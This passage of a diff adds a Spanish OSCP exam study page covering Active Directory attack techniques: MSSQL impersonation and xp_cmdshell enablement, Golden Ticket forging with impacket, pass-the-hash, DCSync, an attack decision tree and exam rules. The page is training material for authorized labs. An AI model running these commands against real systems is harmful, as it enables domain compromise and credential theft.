+<div class="callout warn">Un privilegio "Enabled" en el token NO se aplica solo a cualquier comando: necesitas una herramienta que invoque su semántica (robocopy <code>/B</code> para SeBackup, <code>reg save</code> para las claves SAM/SYSTEM de la sección anterior). No descartes el privilegio porque el comando obvio falló.</div>
+</section>
+
+<section id="ad-extra">
+<h2><span class="n">16d</span>Vectores adicionales (Azure AD Connect, MSSQL)</h2>
+<h4>Azure AD Connect / ADSync</h4>
+<p>Si no hay edge útil hacia Domain Admin pero ves el grupo <code>Azure Admins</code>, cuentas tipo <code>AAD_*</code>, o una máquina con el servicio <code>ADSync</code>: esa máquina guarda credenciales de una cuenta de sincronización con privilegios altos, descifrables por diseño (metodología adconnectdump / AdDecrypt). Suele devolver el password en texto plano de <code>administrator</code> o equivalente.</p>
+<div class="code"><pre>Test-Path "C:\Program Files\Microsoft Azure AD Sync\"
+Get-Service -Name ADSync        # si Running, la base LocalDB del sync está activa</pre></div>
+<h4>MSSQL — impersonation y RCE</h4>
+<div class="code"><pre>proxychains impacket-mssqlclient dominio/user:'pass'@$IP -windows-auth
+# Comprueba tu nivel y a quién puedes impersonar (cada query en UNA línea):
+#   SELECT IS_SRVROLEMEMBER('sysadmin');
+#   SELECT name FROM sys.server_principals;   -> EXECUTE AS LOGIN = '&lt;login&gt;';
+# Si llegas a sysadmin, RCE:
+#   EXEC sp_configure 'show advanced options',1; RECONFIGURE;
+#   EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE;
+#   EXEC xp_cmdshell 'whoami';</pre></div>
+</section>
+
+<section id="ad-dominio">
+<h2><span class="n">17</span>Escalada y persistencia de dominio</h2>
+<div class="callout warn">En el examen rara vez necesitas Golden Ticket para "ganar"; comprometer el DC y leer el flag suele bastar. Pero conoce la técnica.</div>
+<h4>Golden Ticket (requiere hash de krbtgt)</h4>
+<div class="code"><pre># Necesitas: hash NTLM de krbtgt + SID del dominio
+impacket-ticketer -nthash KRBTGT_HASH -domain-sid S-1-5-21-... -domain dominio.local Administrator
+export KRB5CCNAME=Administrator.ccache
+impacket-psexec -k -no-pass dominio.local/Administrator@$DC</pre></div>
+<h4>Caminos típicos a Domain Admin</h4>
+<ul class="notes">
+<li>Usuario Kerberoasteable con contraseña débil → crackear → sus privilegios.</li>
+<li>Admin local reutilizado en varias máquinas (PtH) → llegar al DC.</li>
+<li>BloodHound muestra una ACL abusable (GenericAll, WriteDacl) → tomar control de un grupo/usuario.</li>
+<li>Credenciales en shares SMB, scripts o GPP (<code>cpassword</code>).</li>
+</ul>
+</section>
+
+<section id="ad-arbol">
+<h2><span class="n">18</span>Árbol de decisión — AD (framework de 9 posiciones)</h2>
+<p>La clave para no atascarte en AD es dejar de preguntarte "¿qué exploit uso?" y preguntarte <b>"¿en qué posición estoy ahora mismo?"</b>. Cada posición tiene un conjunto fijo de ataques; identifícala y ataca en ese orden. Avanzar en AD es moverte de una posición a otra hasta llegar al DC.</p>
+<div class="tree"><ul>
+<li><span class="q">1 · Punto de partida — solo IP/red, sin usuarios ni credenciales</span>
+  <ul>
+    <li><span class="a">Señal: acabas de identificar el DC (puertos 88/389/445).</span></li>
+    <li><span class="a">Ataca: enum sin creds — null session, RPC, <code>lookupsid</code>, LDAP anónimo, usuarios en la web. Objetivo: conseguir una LISTA de usuarios. (ver <a href="#ad-enum">Enum AD</a>)</span></li>
+  </ul>
+</li>
+<li><span class="q">2 · Tengo lista de usuarios, pero ninguna contraseña</span>
+  <ul>
+    <li><span class="a">Ataca: AS-REP roasting (<code>-no-pass</code>), password spraying prudente, y usuario=password. Cuentas <code>SVC_*</code> → piensa Kerberoasting en cuanto tengas una cred. (ver <a href="#ad-kerberos">Kerberos</a>)</span></li>
+  </ul>
+</li>
+<li><span class="q">3 · Tengo 1 credencial de dominio (user:pass)</span>
+  <ul>
+    <li><span class="a">Ataca, en este orden: BloodHound (mapa) → Kerberoasting → listar shares/LDAP y cazar más creds → ¿WinRM/SMB admin en algún host? (ver <a href="#ad-creds-hunt">Caza de creds</a>, <a href="#ad-lateral">Lateral</a>)</span></li>
+  </ul>
+</li>
+<li><span class="q">4 · Tengo un hash NTLM, no la contraseña</span>
+  <ul>
+    <li><span class="a">Ataca: Pass-the-Hash (evil-winrm -H / -hashes), <code>nxc</code> para ver DÓNDE es admin ese hash, e intenta crackearlo por si se reutiliza. (ver <a href="#ad-lateral">Lateral</a>)</span></li>
+  </ul>
+</li>
+<li><span class="q">5 · Tengo shell de USUARIO en una máquina</span>
+  <ul>
+    <li><span class="a">Ataca: privesc local — <code>whoami /priv</code> (SeImpersonate→PrintSpoofer) PRIMERO, luego DPAPI, historial de PowerShell, winPEAS y creds en disco. (ver <a href="#priv-win">PrivEsc Win</a>, <a href="#ad-creds-hunt">Caza de creds</a>)</span></li>
+  </ul>
+</li>
+<li><span class="q">6 · Tengo admin local / SYSTEM en una máquina</span>
+  <ul>
+    <li><span class="a">Ataca: volcar SAM/SYSTEM local y lsass (secretsdump/mimikatz), LAPS, y buscar creds de dominio cacheadas → reutilízalas en otros hosts. (ver <a href="#ad-dump">Volcado</a>, <a href="#ad-adcs">LAPS</a>)</span></li>
+  </ul>
+</li>
+<li><span class="q">7 · Tengo un permiso/ACL sobre un objeto (lo ves en BloodHound)</span>
+  <ul>
+    <li><span class="a">Ataca el edge: GenericAll/GenericWrite sobre una cuenta → Shadow Credentials o reset; WriteDacl sobre el dominio → auto-concede DCSync; AddMember → únete al grupo. (ver <a href="#ad-acl">ACL y Shadow Creds</a>)</span></li>
+  </ul>
+</li>
+<li><span class="q">8 · Tengo acceso a un servicio con contexto (MSSQL, AD CS, app web)</span>
+  <ul>
+    <li><span class="a">Ataca: MSSQL sysadmin/impersonation → <code>xp_cmdshell</code>; CA vulnerable → <code>certipy</code> (ESC); app web → creds en el código/BD para reusar. (ver <a href="#ad-adcs">AD CS</a>, <a href="#ad-extra">Vectores adicionales</a>)</span></li>
+  </ul>
+</li>
+<li><span class="q">9 · Tengo privilegio de alto nivel (DA, derechos de replicación o el hash de krbtgt)</span>
+  <ul>
+    <li><span class="a">Ataca: DCSync (<code>secretsdump -just-dc</code>), PtH al DC, lee las flags y documenta. Golden Ticket solo si necesitas persistencia. (ver <a href="#ad-dump">Volcado</a>, <a href="#ad-dominio">Escalada de dominio</a>)</span></li>
+  </ul>
+</li>
+</ul></div>
+<div class="callout good"><b>Posición transversal (puede darse en cualquier punto):</b> ¿el DC o una segunda subred no se alcanzan desde tu Kali? No es una posición nueva, es un bloqueo de red: monta un <a href="#pivoting">túnel (pivoting)</a> y sigues atacando desde la posición en la que ya estabas, pero ahora alcanzando la red interna.</div>
+<div class="callout warn">Si una posición no avanza, casi siempre es porque te saltaste un ataque de su lista (no porque necesites uno más exótico). Repasa la posición entera antes de buscar otra cosa, y recuerda: cada credencial, hash o shell nueva te mueve a OTRA posición — vuelve a mirar esta lista cada vez que consigas algo.</div>
+</section>
+
+<section id="diag">
+<h2><span class="n">DIAG</span>Cuando algo no funciona (síntoma → causa)</h2>
+<p>Errores reales que traban durante horas si no se reconocen. Antes de cambiar de técnica, descarta que sea uno de estos.</p>
+<div class="tbl"><table>
+<tr><th>Síntoma</th><th>Causa probable y qué hacer</th></tr>
+<tr><td>2+ protocolos rechazan la MISMA credencial (LOGON_FAILURE)</td><td>Sospecha del dato copiado, no de la técnica. Reescribe usuario y password a mano.</td></tr>
+<tr><td>Un comando "no da error" pero tampoco parece funcionar</td><td>Verifica el resultado explícitamente (<code>net rpc group members</code>…). Nunca asumas éxito por ausencia de error.</td></tr>
+<tr><td>WinRM conecta pero da <code>WinRMAuthorizationError</code></td><td>No está en "Remote Management Users", o la cuenta tiene <code>ACCOUNTDISABLE</code>. Verifica desde otra cuenta; corrige con bloodyAD.</td></tr>
+<tr><td>Python roto: <code>ImportError ... cryptography.hazmat / asn1</code></td><td>Conflicto de dependencias de otra instalación (pip --break-system-packages). Usa un venv aislado, o <code>pip uninstall cryptography --break-system-packages -y</code>.</td></tr>
+<tr><td>grep no encuentra nada en un archivo que "debería" tenerlo</td><td>Encoding: salida de PowerShell en UTF-16. <code>file archivo.txt</code>; convierte con <code>iconv -f UTF-16LE -t UTF-8</code> antes de grep.</td></tr>
+<tr><td>Comando de Kerberos/certipy falla por <code>KRB_AP_ERR_SKEW</code></td><td>Reloj desincronizado. Antepón <code>faketime "$(ntpdate -q $DC_IP | awk '{print $1" "$2}')" &lt;comando&gt;</code>.</td></tr>
+<tr><td><code>get</code>/<code>cat</code> da "not found" aunque <code>ls</code> lo muestre</td><td>Tiene espacios en el nombre: ponlo entre comillas (<code>get "archivo con espacios.txt"</code>).</td></tr>
+<tr><td>La terminal se cuelga en <code>dquote&gt;</code> o <code>&gt;</code> al escribir un password</td><td>Usaste comillas dobles con un password que tiene <code>!</code>/<code>$</code>/<code>`</code>. Cierra con comilla + Enter (o Ctrl+C) y reescribe con comillas SIMPLES.</td></tr>
+<tr><td>evil-winrm <code>download</code>/<code>upload</code> falla con <code>EstandardError</code></td><td>Bug conocido con archivos Hidden+System (blobs/masterkeys DPAPI). Usa Sliver C2 solo para esa transferencia.</td></tr>
+<tr><td>Tienes shell de Administrator pero "la flag no existe"</td><td>Administrator lee CUALQUIER carpeta: la flag no tiene que estar en su Desktop. Revisa <code>dir C:\Users</code> y busca en el Desktop de otros.</td></tr>
+<tr><td><code>whoami /priv</code> muestra <code>SeImpersonatePrivilege</code> Enabled</td><td>Privesc local directo a SYSTEM vía PrintSpoofer (no toca AD). Revísalo apenas tengas shell nueva — es gratis.</td></tr>
+<tr><td>Pivoting: nmap/ntpdate/bloodhound-python fallan o dan "all filtered"</td><td>proxychains solo tuneliza TCP. Usa <code>nc -nvz</code>/<code>nxc</code> para puertos, <code>faketime</code> en vez de ntpdate, <code>--dns-tcp</code> en bloodhound-python.</td></tr>
+<tr><td>Un comando corrió con un placeholder sin sustituir</td><td>A veces "corre" sin error visible (sobre todo con <code>&lt;</code>/<code>&gt;</code> en cmd.exe, interpretados como redirección). Revisa el output antes de reintentar.</td></tr>
+</table></div>
+</section>
+
+<section id="atascado">
+<h2><span class="n">19</span>¿Atascado? Checklist de rescate</h2>
+<div class="tree"><ul>
+<li><span class="q">Sin foothold</span>
+  <ul>
+    <li><span class="a">¿Escaneé TODOS los puertos (-p-) y UDP?</span></li>
+    <li><span class="a">¿Enumeré CADA servicio a fondo? (versiones, null sessions)</span></li>
+    <li><span class="a">¿Fuzzeé web con otra wordlist y extensiones? ¿Vhosts?</span></li>
+    <li><span class="a">¿Probé credenciales por defecto y reutilización?</span></li>
+    <li><span class="a">¿Busqué la versión exacta en searchsploit y Google?</span></li>
+  </ul>
+</li>
+<li><span class="q">Tengo shell pero no escalo</span>
+  <ul>
+    <li><span class="a">¿Corrí linpeas/winpeas y LEÍ toda la salida?</span></li>
+    <li><span class="a">Linux: ¿<code>sudo -l</code>, SUID, capabilities, crons, kernel?</span></li>
+    <li><span class="a">Win: ¿<code>whoami /priv</code>, servicios, unquoted path, registry?</span></li>
+    <li><span class="a">¿Busqué credenciales en configs, historial, /home, BBDD?</span></li>
+    <li><span class="a">¿Hay otro usuario al que pivotar primero (horizontal)?</span></li>
+  </ul>
+</li>
+<li><span class="q">AD trabado</span>
+  <ul>
+    <li><span class="a">¿Volví a BloodHound con mi usuario marcado como Owned?</span></li>
+    <li><span class="a">¿Probé todas las creds/hashes en TODOS los hosts (CME)?</span></li>
+    <li><span class="a">¿Revisé shares, GPP, scripts por contraseñas?</span></li>
+    <li><span class="a">¿Necesito pivotar para ver el DC u otra subred?</span></li>
+  </ul>
+</li>
+</ul></div>
+<div class="callout good">Si llevas demasiado tiempo: toma un descanso de 10 min, cambia de máquina, y relee tus propias notas. El dato que falta suele estar ya escrito en ellas.</div>
+</section>
+
+<section id="tips">
+<h2><span class="n">20</span>Reglas y gestión del examen</h2>
+<h4>Estructura y puntuación (verifica siempre en tu guía oficial actual)</h4>
+<ul class="notes">
+<li>El examen son <b>23 horas 45 min</b> de hacking + tiempo para el reporte.</li>
+<li>Se necesitan <b>70 puntos</b> para aprobar (de 100).</li>
+<li>Set de <b>Active Directory</b>: 40 puntos — normalmente se puntúa como conjunto (hay que comprometerlo bien).</li>
+<li>Tres máquinas <b>standalone</b>: 20 puntos cada una (10 foothold + 10 privesc, según la versión vigente).</li>
+</ul>
+<div class="callout crit"><b>Restricciones de herramientas (críticas):</b>
+<ul class="notes" style="margin-top:6px">
+<li>Metasploit / Meterpreter / módulos auto de explotación: <b>solo en UNA máquina</b> de todo el examen.</li>
+<li>Prohibidos: herramientas automáticas de explotación de vulnerabilidades masiva, comerciales (Burp Pro active scan, Cobalt Strike), y scripts que automaticen el examen entero.</li>
+<li><code>msfvenom</code>, <code>searchsploit</code>, scripts manuales, CrackMapExec, Impacket, BloodHound, chisel, ligolo: <b>permitidos</b> sin límite.</li>
+<li>Siempre confirma las reglas vigentes en la guía oficial de OffSec antes del examen; pueden cambiar.</li>
+</ul></div>
+<h4>Toma de notas y reporte</h4>
+<ul class="notes">
+<li><b>Screenshots</b> de cada paso: el comando, su salida, y <b>cada flag</b> con <code>ip a</code>/<code>whoami</code> visibles.</li>
+<li>Captura el <code>local.txt</code>/<code>proof.txt</code> junto a la salida de <code>type</code>/<code>cat</code> y la IP de la máquina.</li>
+<li>Herramientas de notas: CherryTree, Obsidian o Sysreptor. Una carpeta por máquina.</li>
+<li>Guarda todos los comandos exactos: el reporte debe permitir <b>reproducir</b> cada paso.</li>
+<li>Entrega el reporte en PDF dentro del plazo (24h tras el examen). Sin reporte válido no hay aprobado.</li>
+</ul>
+<h4>Gestión del tiempo (sugerencia)</h4>
+<div class="tbl"><table>
+<tr><th>Bloque</th><th>Plan</th></tr>
+<tr><td>Inicio</td><td>Lanza nmap -p- en las 4 objetivos a la vez</td></tr>
+<tr><td>Primeras horas</td><td>Ataca el AD o la standalone que veas más clara; consigue puntos pronto</td></tr>
+<tr><td>Si te atascas &gt;1.5-2h</td><td>Rota de máquina. No te enamores de un camino</td></tr>
+<tr><td>Cada flag</td><td>Screenshot inmediato antes de seguir</td></tr>
+<tr><td>Últimas 2-3h</td><td>Para de hackear, revisa que tienes TODAS las capturas</td></tr>
+</table></div>
+</section>
+
+<p class="foot">Material de estudio para la certificación OSCP (Offensive Security). Úsalo solo en el laboratorio y examen autorizados de OffSec o en entornos donde tengas permiso explícito. Verifica siempre las reglas y la puntuación vigentes en la guía oficial del examen, ya que pueden cambiar.</p>
+</main>
+</div>
+
+<script>
+(function(){
+  document.querySelectorAll('.code').forEach(function(box){
+    var pre=box.querySelector('pre'); if(!pre)return;
+    var b=document.createElement('button'); b.className='cp'; b.textContent='Copiar';
+    b.addEventListener('click',function(){
+      var t=pre.innerText;
+      function done(){b.textContent='¡Copiado!';b.classList.add('ok');setTimeout(function(){b.textContent='Copiar';b.classList.remove('ok');},1200);}
+      try{navigator.clipboard.writeText(t).then(done,function(){sel();});}catch(e){sel();}
+      function sel(){var r=document.createRange();r.selectNodeContents(pre);var s=getSelection();s.removeAllRanges();s.addRange(r);try{document.execCommand('copy');done();}catch(_){}}
+    });
+    box.appendChild(b);
+  });
+  var nav=document.getElementById('nav'), mbtn=document.getElementById('mbtn');
+  if(mbtn){mbtn.addEventListener('click',function(){nav.classList.toggle('open');});}
+  nav.querySelectorAll('a').forEach(function(a){a.addEventListener('click',function(){nav.classList.remove('open');});});
+  var links=[].slice.call(nav.querySelectorAll('a[href^="#"]'));
+  var map={}; links.forEach(function(a){map[a.getAttribute('href').slice(1)]=a;});
+  var obs=new IntersectionObserver(function(es){
+    es.forEach(function(e){ if(e.isIntersecting){
+      links.forEach(function(l){l.classList.remove('active');});
+      var a=map[e.target.id]; if(a)a.classList.add('active');
+    }});
+  },{rootMargin:'-20% 0px -70% 0px'});
+  document.querySelectorAll('section[id]').forEach(function(s){obs.observe(s);});
+  var search=document.getElementById('search');
+  var sections=[].slice.call(document.querySelectorAll('section[id]'));
+  search.addEventListener('input',function(){
+    var q=search.value.trim().toLowerCase();
+    sections.forEach(function(s){
+      var hit = q==='' || s.innerText.toLowerCase().indexOf(q)!==-1;
+      s.classList.toggle('hidden-s',!hit);
+    });
+    links.forEach(function(a){
+      var id=a.getAttribute('href').slice(1); var s=document.getElementById(id);
+      if(s) a.style.opacity = s.classList.contains('hidden-s') ? .35 : 1;
+    });
+  });
+  var tbtn=document.getElementById('theme');
+  function cur(){var e=document.documentElement.getAttribute('data-theme');if(e)return e;return matchMedia('(prefers-color-scheme: dark)').matches?'dark':'light';}
+  tbtn.addEventListener('click',function(){
+    var next=cur()==='dark'?'light':'dark';
+    document.documentElement.setAttribute('data-theme',next);
+    try{localStorage.setItem('oscp-theme',next);}catch(e){}
+  });
+  try{var sv=localStorage.getItem('oscp-theme');if(sv)document.documentElement.setAttribute('data-theme',sv);}catch(e){}
+})();
+</script>
+</body></html>
